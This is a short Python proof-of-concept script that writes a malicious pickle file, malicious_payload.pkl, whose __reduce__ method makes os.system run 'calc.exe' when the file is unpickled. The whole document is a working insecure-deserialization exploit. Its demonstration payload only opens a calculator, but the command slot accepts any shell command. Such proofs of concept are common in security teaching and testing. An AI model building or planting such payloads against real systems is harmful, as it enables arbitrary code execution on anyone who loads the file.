import pickle
import os

class Malicious:
    def __reduce__(self):
        return (os.system, ("calc.exe",))

payload = pickle.dumps(Malicious())
with open("malicious_payload.pkl", "wb") as f:
    f.write(payload)
print("Payload is recreated")
